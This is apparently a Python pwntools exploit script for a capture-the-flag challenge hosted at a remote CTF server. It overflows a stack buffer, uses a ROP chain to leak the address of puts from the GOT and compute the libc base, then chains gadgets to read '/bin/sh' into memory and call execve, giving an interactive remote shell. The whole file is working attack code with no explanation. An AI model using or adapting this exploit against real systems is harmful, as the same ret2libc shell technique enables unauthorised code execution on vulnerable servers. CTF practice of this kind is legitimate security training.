from pwn import *

io = remote("nc1.ctfplus.cn", 37693)

# Universal

padding = 32 + 8

pop_rdi = 0x40119E
pop_rsi = 0x4011a0
pop_rdx = 0x4011a2

vuln=0x40120C

got_puts = 0x404018

ptl_puts = 0x401070
ptl_read = 0x401080

# Payload 1

payload1 = (b'a' * padding + p64(pop_rdi) +
    p64(got_puts) + p64(ptl_puts) +
    p64(vuln))

print("[-] payload1 =", payload1)
io.send(payload1)

# Payload 2

io.recvuntil(b"Done!\n")
puts = u64(io.recv(6) + b'\x00\x00')

libc_base = puts - 0x80E50
bss = 0x404068
execve = libc_base + 0xeb080

payload2 = (b'a' * padding +
    p64(pop_rdi) + p64(0) +
    p64(pop_rsi) + p64(bss) +
    p64(pop_rdx) + p64(8) +
    p64(ptl_read) +
    p64(pop_rdi) + p64(bss) +
    p64(pop_rsi) + p64(0) +
    p64(pop_rdx) + p64(0) +
    p64(execve)
)

data = (
    b'/bin/sh\x00'
)

print("[-] payload2 =", payload2)
io.send(payload2)
print("[-] data =", payload2)
io.send(data)

io.interactive()